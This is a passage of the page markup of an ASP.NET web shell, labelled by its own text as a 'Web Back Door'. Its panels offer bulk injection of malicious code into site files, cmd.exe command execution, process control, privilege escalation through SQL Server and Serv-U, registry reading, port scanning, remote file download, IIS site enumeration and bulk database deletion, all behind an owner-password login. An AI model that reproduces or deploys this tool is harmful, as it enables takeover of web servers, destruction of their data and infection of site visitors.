                <td style="width: 100px; height: 21px">
                    <asp:Button ID="cfolder" runat="server" Font-Size="12px" Text="创建目录" OnClick="cfolder_Click" /></td>
            </tr>
        </table>
       <%
       
               }
           }
               if (TreeView2.SelectedValue !="")
               {
                    if (TreeView2.SelectedNode.Text == "新建文本")
                  {
                      cfile.Text = Server.MapPath(".") + "\\jk.aspx";
                        
                          %>
        <table style="font-size: 12px; width: 450px">
            <tr>
                <td style="width: 98px; height: 21px">
                    新 建 文 本:</td>
                <td style="width: 145px; height: 21px">
                    <asp:TextBox ID="cfile" runat="server" Font-Size="12px" Width="170px"></asp:TextBox></td>
                <td style="width: 100px; height: 21px">
                    <asp:Button ID="cfilebtn" runat="server" Font-Size="12px" Text="创建文本" OnClick="cfilebtn_Click" /></td>
            </tr>
        </table>

           <%
                    }
               
               }
                %>
   
         <%
         
             if (TreeView2.SelectedValue != "")
             {
                 if (TreeView2.SelectedNode.Text == "上传文件")
                 {
                     savefile.Text = Server.MapPath(".").ToString() + "\\jk.aspx" ;
          %>    
        <table style="font-size: 12px; width: 631px">
            <tr>
                <td style="width: 154px; height: 30px;">
                    上传文件地址:</td>
                <td style="width: 100px; height: 30px;">
                    <asp:TextBox ID="savefile" runat="server" Width="356px" Font-Size="12px"></asp:TextBox></td>
                <td style="width: 100px; height: 30px;">
                </td>
            </tr>
            <tr>
                <td style="width: 154px; height: 30px;">
                    本地浏览:</td>
                <td style="width: 100px; height: 30px;">
                    <asp:FileUpload ID="FileUpload1" runat="server" Font-Size="12px" Width="366px" /></td>
                <td style="width: 100px; height: 30px;">
                </td>
            </tr>  
        </table>
        <table style="width: 631px">
            <tr>
                <td style="width: 151px">
                </td>
                <td colspan="2" style="width: 372px">
                    <asp:Button ID="uploadfile" runat="server" Font-Size="12px" Text=" 上 传 " OnClick="uploadfile_Click" /></td>
                <td style="width: 100px">
                </td>
            </tr>
        </table>
         <%
      
             }
         }

         if (TreeView2.SelectedValue != "") 
         {
         
          if ( TreeView2.SelectedNode.Text == "批量挂马" )
            {
             
             %>
             
             <table style="width: 631px; font-size: 12px;">
            <tr>
                <td style="width: 119px; height: 30px;">
                    挂马代码:</td>
                <td style="width: 289px" align="center">
                    <asp:TextBox ID="gmcode" runat="server" Width="274px" Font-Size="12px"></asp:TextBox></td>
                <td style="width: 100px">
                </td>
            </tr>
            <tr>
                <td style="width: 119px; height: 30px;">
                    挂马方式:</td>
                <td style="width: 289px; height: 30px;" align="center">
                    <asp:RadioButton ID="bml" runat="server" GroupName="jk" Text="本程序目录" />
                    &nbsp;&nbsp; &nbsp;<asp:RadioButton ID="gml" runat="server" GroupName="jk"
                        Text="根目录" /></td>
                <td style="width: 100px; height: 30px;">
                </td>
            </tr>
            <tr>
                <td style="width: 119px; height: 30px;">
                </td>
                <td style="width: 289px; height: 21px;" align="center">
                    <asp:Button ID="gm" runat="server" Font-Size="12px" Text="批量挂马" OnClick="gm_Click" /></td>
                <td style="width: 100px; height: 21px;">
                </td>
            </tr>
        </table>
             
         <%
          }
        }
        if (TreeView2.SelectedValue != "") 
        {
            
          if (TreeView2.SelectedNode.Text == "批量清马")
           {
             
             %>
             
             <table style="width: 631px; font-size: 12px;">
            <tr>
                <td style="width: 119px; height: 30px;">
                    清马代码:</td>
                <td style="width: 289px" align="center">
                    <asp:TextBox ID="qmcode" runat="server" Width="274px" Font-Size="12px"></asp:TextBox></td>
                <td style="width: 100px">
                </td>
            </tr>
            <tr>
                <td style="width: 119px; height: 30px;">
                    清马方式:</td>
                <td style="width: 289px; height: 30px;" align="center">
                    <asp:RadioButton ID="bcxml" runat="server" GroupName="jk" Text="本程序目录" />
                    &nbsp;&nbsp; &nbsp;<asp:RadioButton ID="gcxml" runat="server" GroupName="jk"
                        Text="根目录" /></td>
                <td style="width: 100px; height: 30px;">
                </td>
            </tr>
            <tr>
                <td style="width: 119px; height: 30px;">
                </td>
                <td style="width: 289px; height: 21px;" align="center">
                    <asp:Button ID="Button2" runat="server" Font-Size="12px" Text="批量清马" OnClick="qingma_Click" /></td>
                <td style="width: 100px; height: 21px;">
                </td>
            </tr>
        </table>
             
          <%
       
       }
        
        }

        if (TreeView2.SelectedValue != "")
        {
            if (TreeView2.SelectedNode.Text == "查找木马")
            {
        %>
      
        
        
        
        <table style="width: 631px; font-size: 12px;">
            <tr>
                <td style="width: 119px">
                    新增特征码:</td>
                <td colspan="2" align="center">
                    <asp:TextBox ID="tzcode" runat="server" Width="274px" Font-Size="12px"></asp:TextBox>
                    &nbsp;&nbsp; (添加多个时，请用逗号隔开)</td>
            </tr>
            <tr>
                <td style="width: 119px; height: 30px;">
                    查找目录:</td>
                <td style="width: 289px; height: 30px;" align="center">
                    <asp:RadioButton ID="czbml" runat="server" GroupName="jk" Text="本程序目录" />
                    &nbsp;&nbsp; &nbsp;<asp:RadioButton ID="czgml" runat="server" GroupName="jk"
                        Text="根目录" /></td>
                <td style="width: 100px; height: 30px;">
                </td>
            </tr>
            <tr>
                <td style="width: 119px; height: 21px;">
                </td>
                <td style="width: 289px; height: 21px;" align="center">
                    <asp:Button ID="find" runat="server" Font-Size="12px" Text=" 查 找 " OnClick="find_Click" /></td>
                <td style="width: 100px; height: 21px;">
                </td>
            </tr>
            <tr>
                <td align="center" colspan="3" style="height: 34px">
                <%=omumastr %>
                </td>
            </tr>
        </table>
         <%
              }
          }
         if (TreeView4.SelectedValue !="")
         {
             if (TreeView4.SelectedNode.Text == "系统信息")
             {

             %>
             <hr />
        <table style="width: 631px; font-size: 12px;">
            <tr>
                <td colspan="3" rowspan="3" style="height: 21px" align="left">
                <%=jsjname + "<br><br>" + "本机IP: " + Request.ServerVariables["LOCAL_ADDR"] + "<br><br>" + getvs + "<br><br>" + getusername + "<br><br>" + getwdir + "<br><br>" + systime + "<br><br>" + "本文件路径:   " + Server.MapPath(Request.ServerVariables["PATH_INFO"]) + "<br><br>" + getosname + "<br><br>" %>
                </td>
            </tr>
            <tr>
            </tr>
            <tr>
            </tr>
        </table>
        <%
         }
             }

             if (TreeView4.SelectedValue != "")
             {

                 if (TreeView4.SelectedNode.Text == "Cmd执行")
                 {
            
             
           %>
           <hr />
        <table style="width: 631px; font-size: 12px;">
            <tr>
                <td colspan="3" style="height: 32px">
                    执行CmdShell</td>
            </tr>
            <tr>
                <td style="width: 114px; height: 29px;">
                    CMD:</td>
                <td colspan="2" style="height: 29px" align="left">
                    <asp:TextBox ID="cmdurl" runat="server" Width="320px" Font-Size="12px">cmd.exe</asp:TextBox></td>
            </tr>
            <tr>
                <td style="width: 114px; height: 29px;">
                    命令:</td>
                <td colspan="2" align="left">
                    <asp:TextBox ID="cmd" runat="server" Width="320px" Font-Size="12px">Set</asp:TextBox></td>
            </tr>
            <tr>
                <td style="width: 114px; height: 158px">
                    回显:</td>
                <td colspan="2" style="height: 158px" align="left">
                    <asp:TextBox ID="cmdshow" runat="server" TextMode="MultiLine" Width="472px" Height="140px" Font-Size="12px"></asp:TextBox></td>
            </tr>
            <tr>
                <td style="width: 114px; height: 25px">
                </td>
                <td colspan="2" style="height: 25px" align="center">
                    <asp:Button ID="cmdbtn" runat="server" Font-Size="12px" Text=" 执 行 " OnClick="cmdbtn_Click" /></td>
            </tr>
        </table>
         <%
            }
        }
        if (TreeView4.SelectedValue != "")
        {
            if (TreeView4.SelectedNode.Text == "进程管理")
            {
                
                
                 %>
                 <hr />
        <table style="font-size: 12px; width: 631px">
            <tr>
                <td style="width: 155px" align="center">
                    新进程:</td>
                <td colspan="2" align="left">
                    <asp:TextBox ID="newjc" runat="server" Width="193px" Font-Size="12px"></asp:TextBox>&nbsp;
                    <asp:Button ID="qidong" runat="server" Font-Size="12px" Text=" 启 动 " OnClick="qidong_Click" /></td>
            </tr>
            <tr>
                <td style="width: 155px; height: 153px;">
                    进程管理:</td>
                <td colspan="2" style="height: 153px" align="left">
                    <asp:ListBox ID="ListBox1" runat="server" Height="140px" Width="462px" Font-Size="12px"></asp:ListBox></td>
            </tr>
            <tr>
                <td style="width: 155px; height: 21px">
                </td>
                <td colspan="2" style="height: 21px" align="center">
                    <asp:Button ID="kp" runat="server" Text="结束进程" Font-Size="12px" OnClick="kp_Click" /></td>
            </tr>
        </table>
         <%
             }
         }

         if (TreeView4.SelectedValue != "")
         {

             if (TreeView4.SelectedNode.Text == "SQL提权(SA)")
             {
                
                %> 
                <hr /> 
        <table style="width: 795px; font-size: 12px;">
            <tr>
                <td align="center" colspan="3" style="height: 31px">
                    
                    <table>
                        <tr>
                            <td style="width: 200px">
                                帐户:&nbsp;</td>
                            <td style="width: 100px">
                    <asp:TextBox ID="sqlname" runat="server" Width="160px"></asp:TextBox></td>
                            <td style="width: 100px">
                                &nbsp;&nbsp; 口令:</td>
                            <td style="width: 100px">
                    <asp:TextBox ID="sqlpass" runat="server" Width="160px"></asp:TextBox></td>
                            <td style="width: 100px">
                                &nbsp;&nbsp; 端口:</td>
                            <td style="width: 100px">
                    <asp:TextBox ID="sqlport" runat="server" Width="160px">1433</asp:TextBox></td>
                        </tr>
                    </table>
                </td>
            </tr>
            <tr>
                <td style="width: 172px; height: 35px;">
                    选择:</td>
                <td colspan="2" align="left" style="height: 36px">
                    <asp:DropDownList ID="DropDownList1" runat="server" Font-Size="12px" Width="337px">
                    </asp:DropDownList></td>
            </tr>
            <tr>
                <td style="width: 172px; height: 35px;">
                    命令:</td>
                <td colspan="2" align="left" style="height: 35px; color: #ff0000;">
                    <asp:TextBox ID="shellcmd" runat="server" Width="382px"></asp:TextBox>
                    &nbsp;&nbsp;&nbsp; ( SA映像劫持不需要输入任何命令！)</td>
            </tr>
            <tr>
                <td style="width: 172px; height: 157px;">
                    回显:</td>
                <td colspan="2" style="height: 157px" align="left">
                    <asp:TextBox ID="sqlshow" runat="server" Height="140px" TextMode="MultiLine" Width="552px"></asp:TextBox></td>
            </tr>
            <tr>
                <td style="width: 172px; height: 30px;">
                    </td>
                <td colspan="2" style="height: 30px">
                    <asp:Button ID="sqlbtn" runat="server" Font-Size="12px" Text=" 执 行 " OnClick="sqlbtn_Click" /></td>
            </tr>
        </table>
        <%
             }
         
         }
             if (TreeView4.SelectedValue !="")
             {

                 if (TreeView4.SelectedNode.Text == "SQL提权(dbowner or public)")
               {
                 
                  %>
        <hr />
        <table style="width: 795px; font-size: 12px;">
            <tr>
                <td align="center" colspan="3">
                    <table style="width: 759px">
                        <tr>
                            <td style="width: 162px; height: 26px;">
                                帐户:&nbsp;</td>
                            <td style="width: 100px; height: 26px;">
                    <asp:TextBox ID="dbname" runat="server" Width="100px"></asp:TextBox></td>
                            <td style="width: 100px; height: 26px;">
                                口令:&nbsp;</td>
                            <td style="width: 100px; height: 26px;">
                    <asp:TextBox ID="dbpass" runat="server" Width="100px"></asp:TextBox></td>
                            <td style="width: 100px; height: 26px;">
                                端口:&nbsp;</td>
                            <td style="width: 100px; height: 26px;">
                    <asp:TextBox ID="dbport" runat="server" Width="100px">1433</asp:TextBox></td>
                        </tr>
                    </table>
                </td>
            </tr>
            <tr>
                <td style="width: 194px; height: 35px;">
                    命令:</td>
                <td colspan="2" align="left" style="height: 35px">
                    <asp:TextBox ID="dbcmd" runat="server" Width="382px"></asp:TextBox></td>
            </tr>
            <tr>
                <td style="width: 194px; height: 157px;">
                    回显:</td>
                <td colspan="2" style="height: 157px">
                    <asp:TextBox ID="dbshow" runat="server" Height="140px" TextMode="MultiLine" Width="585px"></asp:TextBox></td>
            </tr>
            <tr>
                <td style="width: 194px; height: 26px;">
                </td>
                <td colspan="2" style="height: 26px">
                    <asp:Button ID="dbbtn" runat="server" Font-Size="12px" Text=" 执 行 " OnClick="dbbtn_Click" /></td>
            </tr>
        </table>
    
         <%
        
             }
         }
         
          if (TreeView4.SelectedValue !="")
          {
              if (TreeView4.SelectedNode.Text == "注册表读取")    
              {
                              
         %>
         <hr />
        <table style="width: 631px; font-size: 12px;">
            <tr>
                <td style="width: 174px; height: 26px;">
                    读取注册表:</td>
                <td style="width: 286px; height: 26px;">
                    <asp:TextBox ID="regtext" runat="server" Width="374px" Font-Size="12px">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber</asp:TextBox></td>
                <td style="width: 100px; height: 26px;">
                    <asp:Button ID="readreg" runat="server" Font-Size="12px" OnClick="readreg_Click"
                        Text=" 读 取 " /></td>
            </tr>
            <tr>
                <td style="width: 174px; height: 22px;">
                </td>
                <td style="width: 286px; height: 22px; font-size: 12px; color: #ff0000;">
                  <%=oregstr %>
                </td>
                <td style="width: 100px; height: 22px;">
                </td>
            </tr>
            <tr>
                <td style="width: 174px; height: 27px">
                </td>
                <td style="width: 286px; height: 27px">
                    </td>
                <td style="width: 100px; height: 27px">
                </td>
            </tr>
        </table>
        <%
                     
                 }
              }
            
             if (TreeView4.SelectedValue !="")
               {
                   if (TreeView4.SelectedNode.Text == "端口扫描")
                   {
                      
                        %>
                        <hr />
        <table style="width: 631px; font-size: 12px;">
            <tr>
                <td style="font-size: 12px; width: 172px; height: 26px">
                </td>
                <td colspan="2" style="height: 26px">
                    扫 描 端 口</td>
            </tr>
            <tr>
                <td style="width: 172px; height: 36px;">
                    端口设置:</td>
                <td colspan="2" style="height: 36px">
                    <asp:TextBox ID="scanport" runat="server" Width="416px">21,25,80,135,139,443,445,1025,1433,3389,4899,5631,5900,43958</asp:TextBox></td>
            </tr>
             <tr>
                <td style="width: 172px; height: 147px;">
                    扫描结果:</td>
                <td colspan="2" style="height: 147px">
                    <asp:ListBox ID="ListBox2" runat="server" Height="133px" Width="420px"></asp:ListBox></td>
            </tr>
            <tr>
                <td style="width: 172px; height: 21px;">
                </td>
                <td colspan="2" style="height: 21px">
                    <asp:Button ID="scan" runat="server" Font-Size="12px" Text=" 扫 描 " OnClick="scan_Click" /></td>
            </tr>
        </table>
          <%
            
        }
                   }

                   if (TreeView4.SelectedValue != "")
                   {

                       if (TreeView4.SelectedNode.Text == "远程下载")
                       {

                           remoteurl.Text = "http://hi.baidu.com/ahhacker86";
                           localurl.Text = Server.MapPath(".") + @"\jk.asp";
              
              %>  
              <hr />  
        <table style="font-size: 12px; width: 631px; text-align: center;">
            <tr>
                <td style="width: 163px; height: 32px;">
                    远程文件:</td>
                <td style="width: 100px">
                    <asp:TextBox ID="remoteurl" runat="server" Width="313px" Font-Size="12px"></asp:TextBox></td>
                <td style="width: 100px">
                </td>
            </tr>
            <tr>
                <td style="width: 163px; height: 32px">
                    保存地址:</td>
                <td style="width: 100px; height: 32px">
                    <asp:TextBox ID="localurl" runat="server" Width="312px" Font-Size="12px"></asp:TextBox></td>
                <td style="width: 100px; height: 32px">
                </td>
            </tr>
        </table>
        <table style="width: 631px">
            <tr>
                <td style="width: 136px">
                </td>
                <td style="width: 169px">
                    
                    <asp:Button ID="filebtn" runat="server" Font-Size="12px" OnClick="filebtn_Click"
                        Text=" 保 存 " /></td>
                <td style="width: 100px">
                </td>
            </tr>
        </table>
        
         <%
              }
          }

          if (TreeView5.SelectedValue != "")
          {
              if (TreeView5.SelectedNode.Text == "SQL Server")
              {
                  
                         
                       
                  
                  %> 
                  <hr /> 
                  <table style="font-size: 12px; width: 631px">
            <tr>
                <td style="width: 100px; height: 26px;">
                    sql帐户:</td>
                <td style="width: 100px; height: 26px;">
                    <asp:TextBox ID="kusqlname" runat="server" Width="74px"></asp:TextBox></td>
                <td style="width: 100px; height: 26px;">
                    sql密码:</td>
                <td style="width: 100px; height: 26px;">
                    <asp:TextBox ID="kusqlpass" runat="server" Width="84px"></asp:TextBox></td>
                <td style="width: 100px; height: 26px;">
                    端口:</td>
                <td style="width: 100px; height: 26px;">
                    <asp:TextBox ID="kusqlport" runat="server" Width="82px">1433</asp:TextBox></td>
            </tr>
        </table>  
        <table>
            <tr>
                <td style="width: 305px; height: 24px;">
                </td>
                <td style="width: 153px; height: 24px;">
                    <asp:Button ID="kubtn" runat="server" Font-Size="12px" OnClick="kubtn_Click" Text=" 连 接 " /></td>
                <td style="width: 228px; height: 24px;">
                </td>
            </tr>
        </table>
        <hr />
        <table style="font-size: 12px; width: 816px">
         
           
            <tr>
                <td style="width: 67px; height: 138px">
                    SQL数据库:</td>
                <td style="width: 10px; height: 138px" align="left">
                    <asp:ListBox ID="ListBox3" runat="server" Width="312px" Height="126px" Font-Size="12px"></asp:ListBox></td>
                     
                    <td style="width: 93px; height: 138px" align="center">
                    <asp:Button ID="kutable" runat="server" OnClick="kutable_Click" Text="查表-->" Font-Size="12px" /></td>
                    <td style="width: 11px; height: 138px">
                    
                    <asp:ListBox ID="ListBox4" runat="server" Width="312px" Height="129px" Font-Size="12px"></asp:ListBox></td>
            </tr>
        </table>
        <hr />
        <table style="width: 887px; font-size: 12px; text-align: center;">
            <tr>
                <td style="width: 100px;  font-size: 12px; text-align: center;" align="left">
                    <table style="width: 699px; margin-left:100px;">
                        <tr>
                            <td style="width: 100px; height: 7px">
                    <asp:Button ID="databtn" runat="server" Text="显示指定表数据" OnClick="databtn_Click" Font-Size="12px" /></td>
                            <td style="width: 100px; height: 7px">
                    <asp:Button ID="Button4" runat="server" Font-Size="12px" Text="批量删除用户表" OnClick="Button4_Click" /></td>
                            <td style="width: 114px; height: 7px">
                                <asp:Button ID="delzdb" runat="server" Font-Size="12px" Text="删除指定用户表" OnClick="delzdb_Click" /></td>
                                <td style="width: 100px; height: 7px">
                                <asp:Button ID="delku" runat="server" Font-Size="12px" Text="批量删除用户库" OnClick="delku_Click" /></td>
                                <td style="width: 100px; height: 7px">
                                <asp:Button ID="delzdk" runat="server" Font-Size="12px" Text="删除指定用户库" OnClick="delzdk_Click" /></td>
                        </tr>
                    </table>
                </td>
            </tr>
        </table>
        <hr />
        <table style="font-size: 12px; width: 888px">
            <tr>
                <td style="width: 95px; height: 56px">
                    &nbsp;
                    <table style="width: 370px">
                        <tr>
                            <td style="width: 100px; height: 25px">
                    <asp:TextBox ID="datastr" runat="server" Width="267px" Font-Size="12px">DELETE FROM [TableName] WHERE ID=100</asp:TextBox></td>
                            <td style="width: 100px; height: 25px">
                    <asp:Button ID="dropdata" runat="server" Font-Size="12px" OnClick="dropdata_Click"
                        Text="删除数据" /></td>
                        </tr>
                    </table>
                </td>
                <td style="width: 100px; height: 56px">
                    &nbsp;
                    <table>
                        <tr>
                            <td style="width: 91px; height: 19px">
                    <asp:TextBox ID="dataupdate" runat="server" Width="258px" Font-Size="12px">UPDATE [TableName] SET USER='username' WHERE ID=100</asp:TextBox></td>
                            <td style="width: 100px; height: 19px">
                    <asp:Button ID="updatebtn" runat="server" Font-Size="12px" OnClick="updatebtn_Click"
                        Text="更新数据" /></td>
                        </tr>
                    </table>
                </td>
            </tr>
            <tr>
                <td style="width: 95px; height: 50px;">
                    &nbsp;<table>
                        <tr>
                            <td style="width: 106px">
                                <asp:TextBox ID="dataadd" runat="server" Font-Size="12px" Width="272px">INSERT INTO [TableName](USER,PASS) VALUES('username','password')</asp:TextBox></td>
                            <td style="width: 100px">
                    <asp:Button ID="addbtn" runat="server" Font-Size="12px" OnClick="addbtn_Click" Text="添加数据" /></td>
                        </tr>
                    </table>
                    &nbsp;
                </td>
                <td style="width: 100px; height: 50px;">
                    &nbsp;
                    <table>
                        <tr>
                            <td style="width: 100px">
                    <asp:TextBox ID="addbiao" runat="server" Font-Size="12px" Width="258px">CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))</asp:TextBox></td>
                            <td style="width: 100px">
                    <asp:Button ID="ctbtn" runat="server" Font-Size="12px" Text="建立新表" OnClick="ctbtn_Click" /></td>
                        </tr>
                    </table>
                </td>
            </tr>
        </table>
        <hr />
        <table style="width: 888px; font-size: 12px; text-align: left;">
            <tr>
                <td align="left" colspan="2" style="text-align: center; height: 170px;" rowspan="2">
                    &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
                    <asp:GridView ID="GridView1" runat="server" CellPadding="4" ForeColor="#333333" GridLines="None" Width="498px">
                        <FooterStyle BackColor="#990000" Font-Bold="True" ForeColor="White" />
                        <RowStyle BackColor="#FFFBD6" ForeColor="#333333" />
                        <SelectedRowStyle BackColor="#FFCC66" Font-Bold="True" ForeColor="Navy" />
                        <PagerStyle BackColor="#FFCC66" ForeColor="#333333" HorizontalAlign="Center" />
                        <HeaderStyle BackColor="#990000" Font-Bold="True" ForeColor="White" />
                        <AlternatingRowStyle BackColor="White" />
                    </asp:GridView>
                    &nbsp;
                </td>
            </tr>
            <tr>
            </tr>
        </table>
         <%
       
             }
         }
       
        if (TreeView5.SelectedValue !="")
         {
             if (TreeView5.SelectedNode.Text =="Access")
             {
             
             %>
        <table style="font-size: 12px; width: 631px">
            <tr>
                <td style="width: 111px; height: 27px;">
                    Access数据库:</td>
                <td style="width: 100px; height: 27px;">
                    <asp:TextBox ID="accstr" runat="server" Font-Size="12px" Width="393px">Provider=Microsoft.Jet.OLEDB.4.0;Data Source=D:\ASP\zf34\zf34\Database\zf11.mdb;Jet OLEDB:Database Password=***</asp:TextBox></td>
                <td style="width: 100px; height: 27px;">
                    <asp:Button ID="accconn" runat="server" Font-Size="12px" Text=" 连 接 " OnClick="accconn_Click" /></td>
            </tr>
            <tr>
                <td colspan="3" rowspan="2" style="height: 32px" align="center">
                    <asp:Button ID="acczdb" runat="server" Font-Size="12px" Text="删除指定表" OnClick="acczdb_Click" />
                    <asp:Button ID="accpl" runat="server" Font-Size="12px" Text="批量删除表" OnClick="accpl_Click" /></td>
            </tr>
            <tr>
            </tr>
        </table>
        <hr />
        <table style="font-size: 12px; width: 631px">
            <tr>
                <td style="width: 87px; height: 94px">
                    显示所有表:</td>
                <td style="width: 100px; height: 94px">
                    <asp:ListBox ID="ListBox5" runat="server" Width="379px" Height="89px" DataTextField="table_name" AutoPostBack="True" OnSelectedIndexChanged="ListBox5_SelectedIndexChanged"></asp:ListBox></td>
            </tr>
        </table>
        <hr />
        <table style="font-size: 12px; width: 888px">
            <tr>
                <td style="width: 213px">
                    <asp:TextBox ID="addtxt" runat="server" Font-Size="12px" Width="211px">INSERT INTO [TableName](USER,PASS) VALUES('username','password')</asp:TextBox></td>
                <td style="width: 100px">
                    <asp:Button ID="accadd" runat="server" Font-Size="12px" Text="添加数据" OnClick="accadd_Click" /></td>
                <td style="width: 100px">
                    <asp:TextBox ID="updatetxt" runat="server" Font-Size="12px" Width="211px">UPDATE [TableName] SET USER='username' WHERE ID=100</asp:TextBox></td>
                <td style="width: 100px">
                    <asp:Button ID="accupdate" runat="server" Font-Size="12px" Text="更新数据" OnClick="accupdate_Click" /></td>
                <td style="width: 100px">
                    <asp:TextBox ID="deltxt" runat="server" Font-Size="12px" Width="211px">DELETE FROM [TableName] WHERE ID=100</asp:TextBox></td>
                <td style="width: 100px">
                    <asp:Button ID="accdel" runat="server" Font-Size="12px" Text=" 删 除 " OnClick="accdel_Click" /></td>
            </tr>
        </table>
        <hr />
        <table style="font-size: 12px; width: 888px">
            <tr>
                <td style="width: 888px; height: 38px">
                    &nbsp;<asp:GridView ID="GridView2" runat="server" CellPadding="4" ForeColor="#333333" GridLines="None" Width="863px" style="font-size: 12px" >
                        <FooterStyle BackColor="#507CD1" Font-Bold="True" ForeColor="White" />
                        <RowStyle BackColor="#EFF3FB" />
                        <EditRowStyle BackColor="#2461BF" />
                        <SelectedRowStyle BackColor="#D1DDF1" Font-Bold="True" ForeColor="#333333" />
                        <PagerStyle BackColor="#2461BF" ForeColor="White" HorizontalAlign="Center" />
                        <HeaderStyle BackColor="#507CD1" Font-Bold="True" ForeColor="White" />
                        <AlternatingRowStyle BackColor="White" />
                    </asp:GridView>
                </td>
            </tr>
        </table>
         <%
      
      }
      
         }


         if (TreeView4.SelectedValue != "")
         {

             if (TreeView4.SelectedNode.Text == "SU提权")
             {
      
       %>
        <hr />
        <table style="font-size: 12px; width: 631px">
            <tr>
                <td colspan="2" style="height: 34px" align="center">
                    Sev-U 提 权</td>
            </tr>
            <tr>
                <td align="center" colspan="2" style="height: 25px">
                    SU帐户:&nbsp; &nbsp;<asp:TextBox ID="jksuname" runat="server" Font-Size="12px" Width="240px">LocalAdministrator</asp:TextBox></td>
            </tr>
            <tr>
                <td align="center" colspan="2" style="height: 17px">
                    SU密码: &nbsp;
                    <asp:TextBox ID="jksupass" runat="server" Font-Size="12px" Width="240px">#l@$ak#.lk;0@P</asp:TextBox></td>
            </tr>
            <tr>
                <td align="center" colspan="2">
                    SU端口:&nbsp; &nbsp;<asp:TextBox ID="jksuport" runat="server" Font-Size="12px" Width="240px">43958</asp:TextBox></td>
            </tr>
            <tr>
                <td align="center" colspan="2" style="height: 24px">
                    系统命令: &nbsp;<asp:TextBox ID="jksucmd" runat="server" Font-Size="12px" Width="240px"></asp:TextBox></td>
            </tr>
            <tr>
                <td colspan="2" style="height: 34px" align="center">
                    <asp:Button ID="jksubtn" runat="server" Font-Size="12px" Text=" 执 行 " OnClick="jksubtn_Click" /></td>
            </tr>
        </table>
          <%
    
             }
         }

         if (TreeView5.SelectedValue != "")
         {

             if (TreeView5.SelectedNode.Text == "文件打包")
             {
     %>
        <hr />
        <table style="font-size: 12px; width: 321px">
            <tr>
                <td style="width: 147px; height: 30px;" align="center">
                    打包目录:</td>
                <td style="width: 107px; height: 30px;" align="left">
                    <asp:TextBox ID="daboml" runat="server" Style="font-size: 12px" Width="190px"></asp:TextBox></td>
            </tr>
            <tr>
                <td style="width: 147px; height: 30px" align="center">
                    生成地址:</td>
                <td style="width: 107px; height: 30px" align="left">
                    <asp:TextBox ID="dabaodz" runat="server" Style="font-size: 12px" Width="190px"></asp:TextBox></td>
            </tr>
            <tr>
                <td style="width: 147px; height: 30px" align="center">
                    </td>
                <td style="height: 30px" colspan="2">
                    <asp:Button ID="dabaobtn" runat="server" Style="font-size: 12px" Text=" 打 包 " OnClick="dabaobtn_Click" /></td>
            </tr>
        </table>
        <%
             }
             
         }
             if (TreeView5.SelectedValue !="")
             {
                 if (TreeView5.SelectedNode.Text == "About")
                 {
        
                 
                  %>
                  <hr />
        <table style="width: 666px; height: 215px">
            <tr>
                <td style="width: 100px; height: 296px;"><img src ="http://www.ahiec.net/ewebeditor/uploadfile/2009410054896125.gif" alt="jk1986" style="width: 666px; height: 215px" />
                </td>
            </tr>
        </table>
          <%
        
              }
          }
          
        
          if (TreeView4.SelectedValue != "")
          {
              if (TreeView4.SelectedNode.Text == "遍历IIS")
              {
                  string iisstr = "IIS://localhost/W3SVC";
                  DirectoryEntry jkde = new DirectoryEntry(iisstr);
                  Response.Write(" <hr />");
                  Response.Write("<table style='width: 600px; font-size: 12px; text-align: center;'>");
                  Response.Write("<tr>");
                  Response.Write("<td style='width: 295px; height: 29px;' align='center'>");
                  Response.Write("IIS帐户</td>");
                  Response.Write("<td style='width: 204px; height: 29px;' align='center'>");
                  Response.Write(" 域</td>");
                  Response.Write("<td style='width: 181px; height: 29px;' align='center'>");
                  Response.Write(" 路径:</td>");
                  Response.Write("</tr>");
                 
                  foreach (DirectoryEntry destr in jkde.Children)
                  {
                      if (chknumber(destr.Name.ToString()))
                      {
                          string destrname = destr.Name.ToString();
                          DirectoryEntry dirstr = new DirectoryEntry(iisstr + "/" + destrname);
                          DirectoryEntry dirstr1 = dirstr.Children.Find("root", "IIsWebVirtualDir");
                          iisusername = dirstr1.Properties["AnonymousUserName"].Value.ToString();
                          iisdk = destr.Properties["ServerBindings"][0].ToString();
                          iiswebpath = dirstr1.Properties["path"].Value.ToString();
                          Response.Write("<tr>");
                          Response.Write ("<td style='width: 295px; height: 27px; font-size: 12px;' align='center'>");
                          Response.Write(iisusername);
                          Response.Write("</td>");
                          Response.Write("<td style='width: 204px; height: 27px;' align='center'>");
                          Response.Write(iisdk);
                          Response.Write("<td style='width: 181px; height: 27px;' align='center'>");
                          Response.Write ("<a href= '?action=showfolder&folder=");
                          Response.Write(iiswebpath);
                          Response.Write("'>");
                          Response.Write(iiswebpath);
                          Response.Write("</a></td></tr>");    
                           
                      }
                 }
                 Response.Write(" </table>");
         %>

         <%
      
              }
          }
             


       %>
        
         <%

    }
    if (TreeView5.SelectedValue != "")
    {
        if (TreeView5.SelectedNode.Text == "退出登陆")
        {
            Session["jksession"] = null;
            Session.Abandon();
            Response.Write("<script>alert('Thanks Use This BackDoor ^_^ ！');location.href='" + getselfurl + "'</" + "script>");
        }
    }   
             %>
       <%

        if (Session ["jksession"] == null )
        
        {
        
        
         %>
        <table style="font-size: 12px; width: 600px">
            <tr>
                <td colspan="3" style="height: 30px" align="center">
                    &nbsp; &nbsp;  ASP.NET&nbsp; Web Back Door</td>
            </tr>
            <tr>
                <td style="width: 185px; height: 45px" align="center">
                    OwnerPass:</td>
                <td style="width: 129px; height: 45px;" align="center">
                    <asp:TextBox ID="TextBox1" runat="server" Font-Size="12px" Width="235px" TextMode="Password"></asp:TextBox></td>
                <td style="width: 154px; height: 45px;" align="center">
                    <asp:Button ID="Button5" runat="server" Font-Size="12px" Text="Login" OnClick="Button5_Click" /></td>
            </tr>
            <tr>
                <td colspan="3" style="height: 30px" align="center">
                    &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
                   Code &nbsp; By &nbsp; <a href="http://www.jk1986.cn" target ="_blank" >
                    夢幻★劍客</a> &nbsp;
                    &nbsp;</td>
            </tr>
        </table>
        <%    
        }

         %>
 
    </form>
</body>

</html>
